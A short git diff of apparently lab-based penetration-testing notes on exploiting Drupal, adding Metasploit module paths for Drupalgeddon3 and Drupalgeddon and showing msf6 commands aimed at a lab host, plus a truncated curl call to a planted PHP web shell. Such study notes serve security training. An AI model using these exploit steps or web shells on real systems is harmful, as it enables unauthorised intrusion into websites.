@@ -99,9 +99,10 @@ curl http://drupal-dev.inlanefreight.local/adot8.php?fe8edbabc5c5c9b7b764504cd22
 ```
 
 ##### [Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3)
-This is an authenticated remote code execution vulnerability that affects [multiple versions](https://www.drupal.org/sa-core-2018-004) of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie.
+This is an authenticated remote code execution vulnerability that affects [multiple versions](https://www.drupal.org/sa-core-2018-004) of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, **but we must first log in and obtain a valid session cookie**.
 ```bash
-multi/http/drupal_drupageddon3
+exploit/multi/http/drupal_drupageddon3
+exploit/multi/http/drupal_drupageddon
 
 msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
 msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
